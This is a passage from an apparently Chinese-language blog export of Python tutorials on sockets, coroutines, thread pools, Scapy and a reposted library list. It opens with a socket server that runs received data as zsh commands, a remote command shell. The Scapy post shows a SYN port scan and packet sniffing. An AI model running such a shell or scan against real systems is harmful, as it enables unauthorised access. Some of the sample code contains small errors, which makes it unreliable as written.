Popen(['/bin/zsh', '-c', data], stdin=PIPE, stdout=PIPE) cmd_data = cmd.stdout.read() coon.send(cmd_data) except Exception: continue else: print("客户端&#123;&#125;已断开".format(addr)) break 2.获取Window的shell： 12 client.py不变 1234567891011121314151617181920212223242526import socketHOST = '' # 如果是本机最为服务端，地址可以不用填写PORT = 8888BUFSIZE = 1024ADDR = (HOST,PORT)tcp_cient = socket.socket()tcp_cient.connect(ADDR)print("客户端：\n")# 数据交互循环while True: msg = input('&gt;&gt;&gt;') if msg: tcp_cient.send(msg.encode()) # 只能发送 bytes 类型的数据 data = tcp_cient.recv(BUFSIZE) if not data: break print(data.decode()) else: break# tcp_cient.close()# c.close() # 主动断开 # 服务端会recv到一个空字符串 1.阻塞的套接字 阻塞套接字不能和多个客户端进行通信 server.py 1234567891011121314151617181920212223242526272829303132333435"""服务端：阻塞套接字： ---&gt; 阻塞套接字不能和多个客户端进行通信"""import socketHOST = '' # 如果是本机最为服务端，地址可以不用填写PORT = 8888BUFSIZE = 1024ADDR = (HOST,PORT)tcp_server = socket.socket() # type默认是tcp#tcp_server.bind(('',8888)) tcp_server.bind(ADDR) tcp_server.listen(5) # 可以挂起的最大连接数 accept就不算挂起print("开始监听")while True: # 服务端和客户端的循环连接 print("Waiting fpr connecting...") coon, addr = tcp_server.accept() # 获取对等套接字(conn), 以及客户端地址(addr). 这个【只执行一次】，放到外面防止阻塞 print("... connected from:" + str(addr)) # 下面是通信的循环 while True: data = coon.recv(BUFSIZE) # 读取客户端发送的消息 （指明一次性能接收的最大字节数量） if data: print(data.decode()) # 向client发送收到的信息 coon.send(data) else: print("客户端&#123;&#125;已断开".format(addr)) break #server端关闭连接#tcp_server.close()#accpet 阻塞 recv阻塞(读不到数据，就一直等到有数据为止) client.py 12345678910111213141516171819202122232425262728293031"""最简单的客户端三种方式的客户端都是一样的"""import socketHOST = '' # 如果是本机最为服务端，地址可以不用填写PORT = 8888BUFSIZE = 1024ADDR = (HOST,PORT)tcp_cient = socket.socket()tcp_cient.connect(ADDR)print("客户端：\n")# 数据交互循环while True: msg = input('&gt;&gt;&gt;') if msg: tcp_cient.send(msg.encode()) # 只能发送 bytes 类型的数据 data = tcp_cient.recv(BUFSIZE) if not data: break print(data.decode()) else: break# tcp_cient.close()# c.close() # 主动断开 # 服务端会recv到一个空字符串 2.I/O多路复用的套接字server.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768"""服务端I/O多路复用"""# IO多路复用# epoll 事件通知事件# IO事件 计算机 可读事件（有数据了...）# 通知机制 （某一事情发送之后，可读之后） 轮询# epoll： 当socket变为可读的时候，发出通知# epoll： 是惰性的事件回调： 操作系统只起到通知的作用。# epoll： 目前Linux上效率最高的IO多路复用 技术 ！# 1.监听套接字 2.对等套接字import socketimport selectors# windows没有epollsel = selectors.DefaultSelector() # 会根据不同的操作系统选择相应的解释器 在linux是epoll 根据系统自动选择sel2 = selectors.EpollSelector() # 会根据不同的操作系统选择相应的解释器 在linux是epoll Linuxserver = socket.socket()server.bind(('127.0.0.1',8888))server.listen(5)def accept(server): coon, addr = server.accept() sel.register(coon, selectors.EVENT_READ, read)def read(coon): data = coon.recv(1024) if data: print(data) server.send(data.encode()) else: print('Closing:',coon) sel.unregister(coon) # 取消监听 coon.close()# 注册事件 事件触发直接调用sel.register(server, selectors.EVENT_READ, accept) # 监听事件的发生 参数三个： 套接字,可能发送的事件(变为可读事件),回调函数print("开始监听")while True: events_list = sel.select() # 返回发生了事件的列表 查询已经准备好的套接字 print("有套接字发生变化") for key, _ in events_list: # 列表里面是个元组, key是元组里面的第一个值 callback = key.data # 某个套接字绑定的函数 key.data是函数 callback(key.fileobj) # 调用这个回调函数 fileobj是对应套接字# sel.select() 有两种情况：#1. 客户端请求连接 key.data是accept key.fileobj 是server#2. 客户端请求连接 key.data是read key.fileobj 是conn"""1.先在指定的套接字上注册对应的事件及回调2.不断的查询所有已经准备好资源的套接字3.不需要考虑套接字与事件只管调用""" client.py 相同 3.非阻塞的套接字server.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657"""服务端非阻塞套接字"""import sockets = socket.socket() # type默认是tcps.bind(('127.0.0.1', 8888))# 这个必须在操作之前设置s.setblocking(False) # 变为非阻塞套接字， 立刻返回异常s.listen(5)client_list = []while True: # 第一层循环只负责生成对等套接字 try: coon, addr = s.accept() # 多个coon才能与多个客户端进行通信 except BlockingIOError as e: pass else: print("客户端&#123;&#125;连接成功".format(addr)) coon.setblocking(False) # 设置为非阻塞 client_list.append(coon) # 保留已生成的对等套接字 # print(coon, addr) for client_socket in client_list: # 第二层循环 把所有已保留的套接字都执行一遍 try: data = client_socket.recv(1024) except BlockingIOError: pass else: if data: print('&#123;&#125;:&#123;&#125;'.format(client_socket, data.decode())) client_socket.send(data) else: print('&#123;&#125;'.format(client_socket)) client_socket.close() client_list.remove(client_socket) # 成功处理完一个，就移除一个## 实现方法：非阻塞+轮询# connect操作一定会引发BlockingIOError异常# 如果连接没有建立，那么send操作引发OSError异常"""accept 阻塞：在没有新的套接字来之前，不能处理已经建立连接的套接字的请求recv 阻塞:在没有接受到客户端请求数据之前，不能与其他客户端建立连接""" client.py 相同 成为大师1234567891011121314"""1. 多练习，一定要善于发现感兴趣的内容，通过所学知识去实现2. 关注相关领域： 寻找大师，跟随大市，与大师同行，洞察大师，成为大师 知乎，ve2x.com, github3.扩展： 想要提高，就不能守着自己现有的东西而不去学习新的4.应用： 根据自己的需求，动手实践，达到目标 安全： 分析行为：通过日志，分析攻击行为(re)"""]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>socket</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-协程]]></title>
    <url>%2Fpython-%E5%8D%8F%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[概念1.进程(同步)进程是系统进行资源分配和调度的一个独立单位。每个进程都有自己的独立内存空间，不同进程通过进程间通信来通信。 上下文进程间的切换开销，比较大，但相对比较稳定安全 2.线程（同步）线程是CPU调度和分派的基本单位。 线程间通信主要通过共享内存，上下文切换很快，资源开销较少，但相比进程不够稳定容易丢失数据。 3.协程（异步）协程是一种用户态的轻量级线程，协程的调度完全由用户控制 “协程就是你可以暂停执行的函数”。协程拥有自己的寄存器上下文和栈。 非抢占式多任务 协程与线程的区别:1) 一个线程可以多个协程，一个进程也可以单独拥有多个协程。 2) 线程进程都是同步机制，而协程则是异步。 3) 协程能保留上一次调用时的状态，每次过程重入时，就相当于进入上一次调用的状态。 4）线程是抢占式，而协程是非抢占式的，所以需要用户自己释放使用权来切换到其他协程，因此同一时间其实只有一个协程拥有运行权，相当于单线程的能力。 5）协程并不是取代线程, 而且抽象于线程之上, 线程是被分割的CPU资源, 协程是组织好的代码流程, 协程需要线程来承载运行, 线程是协程的资源, 但协程不会直接使用线程, 协程直接利用的是执行器(Interceptor), 执行器可以关联任意线程或线程池, 可以使当前线程, UI线程, 或新建新程.。 6）线程是协程的资源。协程通过Interceptor来间接使用线程这个资源。 代码greenlet 1234567891011121314151617181920212223242526272829303132333435363738# 协程 =&gt;又叫：非抢占式多任务# 中断执行# 线程"""pip install greenlet"""# 基本使用from greenlet import greenletimport randomimport timedef Producer(): while True: item = random.randint(0, 99) print("pro生产了&#123;&#125;".format(item)) c.switch(item) # 暂停当前协程,切换到(执行的协程)消费者，并将item传入消费者 time.sleep(1)def Consumer(): while True: item = p.switch() # 切换到生产者， 并等待消费者传入item print("消费了&#123;&#125;".format(item))c = greenlet(Consumer) # 将一个普通函数变成协程p = greenlet(Producer)c.switch() # 让消费者先进入暂停状态， （只有恢复的时候才能接受数据）"""# greenlet 的价值价值一： 高性能的原生协程价值二： 语义更加明确的显式切换价值三： 直接将函数包装成协程，保持原有代码风格""" gevent gevent是一个基于协程的python网络库，在遇到IO阻塞时，程序会自动进行切换，可以让我们用同步的方式写异步IO代码。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293# gevent # 当一个greenlet遇到IO操作，比如访问网络，就会自动切换，直到IO操作完成，再切换回来# 遇到阻塞就切换到另一个协程继续执行 ！"""pip install geventgevent，通过封装了 libev（基于epoll） 和 greenlet 两个库。帮我们做好封装，允许我们以类似于线程的方式使用协程。以至于我们几乎不用重写原来的代码就能充分利用 epoll 和 协程 威力"""import geventfrom gevent.queue import Queue# 猴子补丁 monkey 将一些阻塞的模块动态的修改为非阻塞from gevent import monkey;monkey.patch_all() # 不会阻塞了就from gevent import monkey;monkey.patch_socket() # 不会阻塞了就import requestsimport geventdef get_response(): print("start") requests.get("https://www.baidu.com") print("end")tasks = [gevent.spawn(get_response) for i in range(20)] # 创建协程gevent.joinall(tasks) # 阻塞等待协程完毕# ---------------------------------------------------------------------### gevent 并发服务器import gevent# 将python内置的socket直接换成了IO多路复用的socketfrom gevent import monkey;monkey.patch_socket()import socketserver = socket.socket()server.bind(('127.0.0.1', 8888))server.listen(1000)def worker_coroutine(conn): while True: recv_data = conn.recv(1000) if recv_data: print(recv_data) conn.send(recv_data) else: conn.close() breakif __name__ == '__main__': while True: conn, remote_addr = server.accept() # 生成一个协程， 并将conn作为参数传入 gevent.spawn(worker_coroutine, conn) # ---------------------------------------------------------------------# gevent 协程通信"""问题一： 协程之间不是能通过switch通信嘛？是的，由于 gevent 基于 greenlet，所以可以。问题二： 那为什么还要考虑通信问题？因为 gevent 不需要我们使用手动切换，而是遇到阻塞就切换，因此我们不会去使用switch ！"""import geventfrom gevent import monkey;monkey.patch_all()from gevent.queue import Queueimport randomqueue = Queue(3)def Producer(): while True: item = random.randint(0, 99) print("生产了&#123;&#125;".format(item)) queue.put(item)def Consumer(): while True: item = queue.get() print("消费了&#123;&#125;".format(item))p = gevent.spawn(Producer, queue) # 将函数封装成协程， 并开始调度c = gevent.spawn(Consumer, queue)# gevent.sleep(5)gevent.joinall([p, c]) # 阻塞（一阻塞就切换协程） 等待 等待你带进来的所有协程对象结束 Note: 1234# 这三句一定要放在最上面import geventfrom gevent import monkeymonkey.patch_all()]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>协程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-自带的线程池和进程池]]></title>
    <url>%2Fpython-%E8%87%AA%E5%B8%A6%E7%9A%84%E7%BA%BF%E7%A8%8B%E6%B1%A0%E5%92%8C%E8%BF%9B%E7%A8%8B%E6%B1%A0%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# from multiprocessing import Pool # 进程池from multiprocessing.dummy import Pool #线程池from multiprocessing.pool import ThreadPool # 线程池import threadingimport timedef func(i): print("&#123;&#125;-------555".format(i)) time.sleep(2) return idef print_back(*args, **kwargs): print("处理数据完成",args, kwargs)pool = Pool(6) # 不写的话 默认是cpu的个数# print(threading.active_count())for i in range(5): pool.apply_async(func=func, args=(i,), callback=print_back) ## 添加任务 不阻塞 主要使用的方法# pool.apply(func=func, ) ## 添加任务 阻塞# pool.map(func, [i for i in range(5)]) #添加任务 不阻塞pool.close() #关闭线程池 不在提交新的任务pool.join() #等待进程池中的任务执行完毕print("任务结束")########### 线程池的步骤p = ThreadPool(3) # 实例化p.apply_async(func) # 函数 # 可以将返回值.get() 但是get也会i阻塞p.close()p.join()# 进程池比线程池耗费资源# 可以将返回值.get() 但是get也会i阻塞async_result = p.apply_async(func) # 函数print(async_result.get())]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>线程池</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-线程池并发服务器]]></title>
    <url>%2Fpython-%E7%BA%BF%E7%A8%8B%E6%B1%A0%E5%B9%B6%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%2F</url>
    <content type="text"><![CDATA[server 1234567891011121314151617181920212223242526# 使用线程池来实现并发服务器import socketfrom multiprocessing.dummy import Pooldef worker(conn): while True: recv_data = conn.recv(1000) if not recv_data: break print("客户端&#123;&#125;发送了&#123;&#125;".format(conn, recv_data.decode())) conn.send(recv_data) conn.close()if __name__ == '__main__': server = socket.socket() server.bind(('127.0.0.1', 8888)) server.listen(1000) pool = Pool(3) while True: conn, addr = server.accept() print("客户端&#123;&#125;连接成功".format(addr)) pool.apply_async(func=worker, args=(conn,)) client 12345678910111213141516import socketc = socket.socket()c.connect(('127.0.0.1',8888))while True: msg = input('&gt;&gt;&gt;') if msg: c.send(msg.encode()) # 只能发送 bytes 类型的数据 encode将中文的变成byte的 print(c.recv(1024)) else: breakc.close()]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>线程池</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-简单的线程池的实现]]></title>
    <url>%2Fpython-%E7%AE%80%E5%8D%95%E7%9A%84%E7%BA%BF%E7%A8%8B%E6%B1%A0%E7%9A%84%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# 多进程服务器 创建 销毁# 通过提前创建好线程 当任务来了 就分配线程去执行"""主线程： 相当于生产者，只管向线程池提交任务。 并不关心线程池是如何执行任务的。 因此，并不关心是哪一个线程执行的这个任务。线程池： 相当于消费者，负责接收任务， 并将任务分配到一个空闲的线程中去执行。"""from threading import Threadfrom queue import Queueimport timeclass ThreadPool: def __init__(self, n): # 意味着传啦几次 self.queue = Queue() for i in range(n+1): # 每个线程都去执行类里面的func方法 Thread(target=self.work, args=(self.queue, ), daemon=True).start() def work(self): while True: func, args, kwargs = self.queue.get() func(*args, **kwargs) self.queue.task_done() def apply_async(self, func, args=(), kwargs=&#123;&#125;): # 主线程调用的 self.queue.put((func, args, kwargs)) # 扔到队列里面 def join(self): self.queue.join()def task1(): time.sleep(2) print("111")def task2(): time.sleep(2) print("222222")pool = ThreadPool(2)pool.apply_async(task1)pool.apply_async(task2)print("任务提交完成")pool.join()print("任务完成")]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>线程池</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-可重复利用的线程]]></title>
    <url>%2Fpython-%E5%8F%AF%E9%87%8D%E5%A4%8D%E5%88%A9%E7%94%A8%E7%9A%84%E7%BA%BF%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122232425262728293031323334353637import threadingimport queueclass MyThread(threading.Thread): def __init__(self): super().__init__() self.queue = queue.Queue() self.daemon = True # 守护进程 self.start() # def run(self): # 只有run里的才是子线程执行的 while True: func, args, kwargs = self.queue.get() # 从队列当中获取任务 func(*args, **kwargs) self.queue.task_done() def apply_async(self, func, args=(), kwargs=&#123;&#125;): self.queue.put((func, args, kwargs)) def join(self, timeout=None): # 等待所有提交的任务执行完毕 self.queue.join() # 解阻塞def print_one(): print('111111111')def print_two(): print('222222222222')if __name__ == '__main__': t = MyThread() t.apply_async(print_one) t.apply_async(print_two, args=(1,2), kwargs=&#123;"a":1,'b':2&#125;) t.join() # 线程的join 等待队列结束]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>线程池</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python之Scapy]]></title>
    <url>%2FPython%E4%B9%8BScapy%2F</url>
    <content type="text"><![CDATA[关于Scapy是一个Python程序，使用户能够发送，嗅探和剖析并伪造网络数据包。此功能允许构建可以探测，扫描或攻击网络的工具。 换句话说，Scapy是一个功能强大的交互式数据包操作程序。它能够伪造或解码大量协议的数据包，通过线路发送，捕获它们，匹配请求和回复等等。Scapy可以轻松处理大多数经典任务，如扫描，跟踪路由，探测，单元测试，攻击或网络发现。它可以取代hping，arpspoof，arp-sk，arping，p0f甚至是Nmap，tcpdump和tshark的某些部分。Scapy主要做两件事：发送数据包和接收答案。 在python中可以通过scapy这个库轻松实现构造数据包、发送数据包、分析数据包，为网络编程之利器！ 项目地址：https://github.com/secdev/scapy 安装Scapy 有两种使用方式： 直接在shell中使用 12345# 先下载项目到本地git clone git@github.com:secdev/scapy.git# 运行./run_scapy# 交互式使用 作为Python的第三方库使用 1234# 安装pip3 install scapy# 导入from scapy.all import * 使用构造数据包123456789101112131415161718192021222324252627from scapy.all import *# 2.构造数据包 IP()创建一个默认数据包# ls(IP()) 可以查看IP数据包可以有哪些参数。# 其他数据包同理： TCP(),pkt = IP(dst="114.114.114.114")pkt.show() # 查看数据包信息pkt.summary() # 方法查看概要信息hexdump(pkt) # 查看数据包的字节信息# 使用 '/' 操作符来给数据包加上一层# 例如构造一个TCP数据包，在IP层指明数据包的目的地址。在TCP层可以设定数据包的目的端口等等。UDP数据包同理。tcpkt = IP(dst="114.114.114.114")/TCP()tcpkt.show()# 数据包的目标端口可以用范围来表示，发送的时候就会发送dport 不同的多个数据包tcpkt = IP(dst="114.114.114.114")/TCP(dport=(22,33))# 如果设置了多个参数为范围的，最后发送的数据包就是笛卡尔积。tcpkt = IP(dst="114.114.114.114")/TCP(dport=(22,33), sport=(4567, 4568))for tcp in tcpkt: print(tcp.dport, tcp.sport) 发送数据包 (可能需要管理员权限)123456789101112131415161718192021# 3.发送数据包# 发送数据包可能需要管理员权限，使用sudo python3 进入python即可。## scapy发送数据包有常用的如下几种方法："""send(pkt) 发送三层数据包，但不会受到返回的结果(发完就拉倒)。sr(pkt) 发送三层数据包，返回两个结果，分别是接收到响应的数据包和未收到响应的数据包。sr1(pkt) 发送三层数据包，仅仅返回接收到响应的数据包。sendp(pkt) 发送二层数据包。srp(pkt) 发送二层数据包，并等待响应。srp1(pkt) 发送第二层数据包，并返回响应的数据包"""# 例如：ans, uans = sr(pkt)print(ans)print(uans) 简单应用1234567891011121314151617181920212223242526# 4.应用# 1）可以构造数据包来实现一个简单的 SYN端口扫描 ，flags="S" 表示发送SYN数据包port_scan = IP(dst="192.168.0.121")/TCP(dport=[22,80,135,443,3306,3389], flags="S")ans, uans = sr(port_scan)ans.summary()'''端口返回的flag位为 SA，表示这些端口是开放的。而 RA 表示reset ack， 说明这些端口是关闭的。【见下面图片】'''# 2）实现一个基于TCP的tracerouteans, uans = sr(IP(dst="114.114.114.114", ttl=(1,20), id=RandShort())/TCP(flags="0x2"))for snd, rcv in ans: print(snd.ttl, rcv.src, isinstance((rcv.payload, TCP))# 3) 模拟TCP的三次握手source = IP(dst="192.168.0.121")/TCP(dport=22)rsp = sr1(source)source2 = IP(dst="192.168.0.121")/TCP(dport=22, flags="A", seq=rsp.ack, ack=rsp.seq+1)rsp2 = sr1(source2)print(rsp2.show()) 其他12345678910# 5.其他# scapy 还可以用来读取网络流量包或监听网卡流量。"""1. 使用函数 rdpcap("/abc/def/xxxx.pcap") 可以读取包的内容，2. 再使用 haslayer(TCP) 或 haslayer(ICMP) 等等来判断数据包的类型。3. 使用 sniff(iface="who1",count=100,filter="tcp xxxx") 可以监听网卡流量，iface声明监听的网卡，filter是过滤条件，count是符合过滤条件的数据包的个数，达到指定的数据包个数后会停止监听，不设count则没有限制，按ctrl-c 结束监听。4. sniff也支持无线网卡的监听模式。""" 抓包、分析包1234567891011121314151617181920212223242526"""prn指向一个回调函数，意为将收到的包丢给prn指向的函数处理（注意：回调的意义！每收到一个包就丢到回调函数里执行一下，执行完了才再跑回来继续抓包）filter为包过滤规则（语法参照tcpdump过滤规则）store为是否要存储抓到的包（注意，如果没有存储则不会将抓到的包赋值给a，因为没有存下就没有东西可以赋，此参数默认开启）timeout为抓包时长，比如抓30秒就结束（注意：如果没有指定抓包时长则会一直抓下去，程序会一直卡在这里）iface为指定抓包的网卡"""a = sniff(prn=abc, filter='tcp port 80 and ip 192.168.1.1', store=1, timeout=30, iface='eth0') # 此函数可以将抓到的包存到本地（注意：将包写入本地不能使用open（'packet.cap', 'r'）,因为open函数只能写入字符串）。wrpcap('packet.cap', a) # 此函数可以将本地存储的数据包读取出来bbb = rdpcap('/root/Desktop/ftp.cap') # 读取出来的对象是由N个数据包组成的可迭代对象，每次迭代一个包for i in bbb: try: # 输出数据包的应用层负载 print(i.getlayer('Raw').fields['load'].decode().strip()) except : continue 先简单了解一下，剩下的后面慢慢学 更多用法见官方文档：https://scapy.readthedocs.io/en/latest/]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>Python</tag>
        <tag>Scapy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-常用库]]></title>
    <url>%2Fpython-%E5%B8%B8%E7%94%A8%E5%BA%93%2F</url>
    <content type="text"><![CDATA[转载自：https://www.jianshu.com/p/d25a9169fe86 哈哈哈，我见大佬把这么多库都整理出来了，赶紧转载一下，太厉害啦。 库名称 简介 Chardet 字符编码探测器，可以自动检测文本、网页、xml的编码。 colorama 主要用来给文本添加各种颜色，并且非常简单易用。 Prettytable 主要用于在终端或浏览器端构建格式化的输出。 difflib，[Python]标准库，计算文本差异Levenshtein，快速计算字符串相似度。 fuzzywuzzy 字符串模糊匹配。 esmre 正则表达式的加速器。 shortuuid 一组简洁URL/UUID函数库。 ftfy，Unicode文本工具7 unidecode，ascii和Unicode文本转换函数。 xpinyin，将汉字转换为拼音的函数库 pangu.py，调整对中日韩文字当中的字母、数字间距。 pyfiglet，Python写的figlet程序，使用字符组成ASCII艺术图片 uniout，提取字符串中可读写的字符 awesome slugify，一个Python slugify库，用于处理Unicode。 python-slugify，转换Unicode为ASCII内码的slugify函数库。 unicode-slugify，生成unicode内码，Django的依赖包。 ply，Python版的lex和yacc的解析工具phonenumbers，解析电话号码，格式，存储和验证的国际电话号码。 python-user-agents，浏览器的用户代理（user-agents）的解析器。 sqlparse，SQL解析器。 pygments，一个通用的语法高亮工具。 python-nameparser，解析人名，分解为单独的成分。 pyparsing，通用解析器生成框架。 tablib，表格数据格式，包括，XLS、CSV，JSON，YAML。 python-docx，docx文档读取，查询和修改，微软Word 2007 / 2008的docx文件。 xlwt/xlrd，读写Excel格式的数据文件。 xlsxwriter，创建Excel格式的xlsx文件。 xlwings，利用Python调用Excelcsvkit，CSV文件工具包。 marmir，把Python[数据结构]，转化为电子表格。 pdfminer，从PDF文件中提取信息。 pypdf2， 合并和转换PDF页面的函数库。 Python-Markdown，轻量级标记语言Markdown的Python实现。 Mistune，,快速、全功能的纯Python编写的Markdown解释器。 dateutil，标准的Python官方datetime模块的扩展包，字符串日期工具，其中parser是根据字符串解析成 datetime，而rrule是则是根据定义的规则来生成datetime。 arrow,更好的日期和时间处理Python库 chronyk，一个Python 3版函数库，用于解析人写的时间和日期。 delorean，清理期时间的函数库。 when.py，为见的日期和时间，提供人性化的功能。 moment，类似Moment.js的日期/时间Python库 pytz，世界时区，使用tz database时区信息[数据库] BeautifulSoup，基于Python的HTML/XML解析器，简单易用, 功能很强大,即使是有bug，有问题的html代码，也可以解析。 lxml，快速，易用、灵活的HTML和XML处理库，功能超强，在遇到有缺陷、不规范的xml时，Python自带的xml处理器可能无法解析。报错时，程序会尝试再用lxml的修复模式解析。 htmlparser，官方版解析HTML DOM树，偶尔搞搞命令行自动表单提交用得上。 pyyaml，Python版本的YAML解释器。 html5lib，-标准库，解析和序列化HTML文档和片段。 pyquery，类似[jQuery]的的HTML解释器函数库。 cssutils，Python CSS库。 MarkupSafe，XML或HTML / XHTML安全字符串标记工具。 cssutils - ACSS library for Python., MarkupSafe - Implements a XML/HTML/XHTMLbleach，漂白，基于HTML的白名单函数库。 xmltodict，类似JSON的XML工具包。 xhtml2pdf，HTML / CSS格式转换器，看生成pdf文档。 untangle，把XML文档，转换为Python对象，方便访问。 文件处理 库名称简介Mimetypes，Python标准库，映射文件名到MIME类型。 imghdr，Python标准库，确定图像类型。 python-magic，libmagic文件类型识别库，Python接口格式。 path.py，os.path模块的二次封装。 watchdog，一组API和shell实用程序，用于监视文件系统事件。 Unipath，面向对象的文件/目录的操作工具包。 pathlib，-（Python 3.4版已经作为Python标准库），一个跨平台，面向path的函数库。pickle/cPickle,python的pickle模块实现了基本的数据序列和反序列化。通过pickle模块的序列化操作我们能够将程序中运行的对象信息保存到文件中去，永久存储；通过pickle模块的反序列化操作，我们能够从文件中创建上一次程序保存的对象。 cPickle是[C语言]实现的版本，速度更快。 ConfigParser，Python标准库，INI文件解析器。 configobj，INI文件解析器。 config，分层次配置，logging作者编写。 profig，多格式配置转换工具。 logging，Python标准库，日志文件生成管理函数库。 logbook，logging的替换品。 Sentry，实时log服务器。 Raven，哨兵Sentry的Python客户端。 Sphinx，斯芬克斯（狮身人面像），Python文档生成器。 reStructuredText，标记语法和解析工具，Docutils组件。 mkdocs，Markdown格式文档生成器。 pycco，简单快速、编程风格的文档生成器。 pdoc，自动生成的Python库API文档epydoc，从源码注释中生成各种格式文档的工具 图像处理 库名称简介PIL（Python Image Library），基于Python的图像处理库，功能强大，对图形文件的格式支持广泛，内置许多图像处理函数，如图像增强、滤波[算法]等。 Pillow，图像处理库，PIL图像库的分支和升级替代产品。 Matplotlib，著名的绘图库，提供了整套和matlab相似的命令API，用以绘制一些高质量的数学二维图形，十分适合交互式地进行制图。 brewer2mpl，有一个专业的python配色工具包，提供了从美术角度来讲的精美配色。 PyGame基于Python的多媒体开发和游戏软件开发模块，包含大量游戏和图像处理功能。 Box2d，开源的2d物理引擎，愤怒的小鸟就是使用了这款物理引擎进行开发的，Box2d物理引擎内部模拟了一个世界，你可以设置这个世界里的重力，然后往这个世界里添加各种物体，以及他们的一些物理特性，比如质量，摩擦，阻尼等等。 Pymunk，类似box2d的开源物理图形模拟库。 OpenCV, 目前最好的开源图像/视觉库，包括图像处理和计算机视觉方面、[机器学习]的很多通用算法。 SimpleCV，计算机视觉开源框架，类似opencv。 VTK，视觉化工具函式库（VTK， Visualization Toolkit）是一个开放源码，跨平台、支援平行处理（VTK曾用于处理大小近乎1个Petabyte的资料，其平台为美国Los Alamos国家实验室所有的具1024个处理器之大型系统）的图形应用函式库。2005年时曾被美国陆军研究实验室用于即时模拟俄罗斯制反导弹战车ZSU23-4受到平面波攻击的情形，其计算节点高达2.5兆个之多。 cgkit,Python Computer Graphics Kit,其module 主要分两个部分 \1. 与3d相关的一些python module 例如the vector, matrix and quaternion types, the RenderMan bindings, noise functions 这些模块可以在maya houdini nuke blender 等有Python扩展的程序中直接用; \2. 提供完整的场景操作的module， 他类似其他三维软件，在内存中保留完整的描述场景的信息。不能直接用于maya 等。 CGAL，Computational Geometry Algorithms Library，计算几何算法库，提供计算几何相关的数据结构和算法，诸如三角剖分（2D约束三角剖分及二维和三维Delaunay三角剖分），Voronoi图（二维和三维的点，2D加权Voronoi图，分割Voronoi图等），多边形（布尔操作，偏置），多面体（布尔运算），曲线整理及其应用，网格生成（二维Delaunay网格生成和三维表面和体积网格生成等），几何处理（表面网格简化，细分和参数化等），凸壳算法（2D，3D和dD），搜索结构（近邻搜索，kd树等），插值，形状分析，拟合，距离等。 Aggdraw，开源图像库，几乎涵盖了2d image操作的所有功能，使用起来非常灵活。 Pycairo,开源矢量绘图库 Cairo开罗的python接口，cairo提供在多个背景下做2-D的绘图，高级的更可以使用硬件加速功能。 wand，Python绑定魔杖工具（MagickWand），C语言API接口。 thumbor， -智能成像工具，可调整大小和翻转图像。 imgSeek，查询相似的图像。 python-qrcode，纯Python的二维码（QR码）生成器。 pyBarcode，创建条码，无需PIL模块。 pygram，Instagram像图像过滤器。 Quads，基于四叉树的计算机艺术。 nude.py，裸体检测函数。 scikit-image，scikit工具箱的图像处理库。 hmap，图像直方图工具。 bokeh，交互的Web绘图。 plotly，Web协同的Python和Matplotlib绘制。 vincent，文森特，Python Vega的函数库。 d3py，Python绘图库，基于D3.JS, ggplot -API兼容R语言的ggplot2.Kartograph.py，在Python绘制漂亮的SVG地图。 pygal， SVG图表的创造者。 pygraphviz，Graphviz的Python接口。 Fonttlools，ttf字体工具函数包，用于fontforge、ttx等字体软件。 游戏和多媒体 库名称简介audiolazy，数字信号处理（DSP）的Python工具包。 audioread，跨平台（GStreamer + Core Audio + MAD + FFmpeg）音频解码库。 beets，音乐库管理。dejavu，音频指纹识别算法。 Dejavu 听一次音频后就会记录该音频的指纹信息，然后可通过麦克风对输入的音频进行识别是否同一首歌。 django-elastic-transcoder,Django +亚马逊elastic转码。 eyeD3,音频文件工具，特别是MP3文件包含的ID3元数据。 id3reader，用于读取MP3的元数据。 mutagen，处理音频元数据。 pydub，-操纵音频和简单的高层次的接口。 pyechonest，Echo Nest API客户端。 talkbox，语音和信号处理的Python库。 TimeSide，开放的网络音频处理框架。 tinytag，读取音乐文件元数据，包括的MP3，OGG，FLAC和wave文件。 m3u8，用于解析m3u8文件。 moviepy，多格式视频编辑脚本模块，包括GIF动画。 shorten.tv，视频摘要。scikit视频，SciPy视频处理例程。 GeoDjango,一个世界级的地理Web框架。 geopy,Geo地理编码的工具箱。 pygeoip，纯Python写的GeoIP API。 GeoIP，Python API接口，使用高精度GeoIP Legacy Database数据库。 geojson，GeoJSON函数库django-countries，一个Django程序，提供国家选择，国旗图标的静态文件，和一个国家的地域模型。 Pygame，Python游戏设计模块。 Cocos2d，2D游戏框架，演示，和其他的图形/交互应用，基于pyglet。Cocos2d- cocos2d is a framework for building 2D games, demos, and other graphical/interactive applications. It is based on pyglet.,PySDL2，SDL2的封装库。 Panda3D- 3D游戏引擎，迪士尼开发。用C++写的，完全兼容Python。 PyOgre，OGRE 3D渲染引擎，可用于游戏，模拟，任何3D。 PyOpenGL，绑定OpenGL和它相关的API。 PySFML，Python绑定SFMLRenPy，视觉小说引擎。 大数据与科学计算 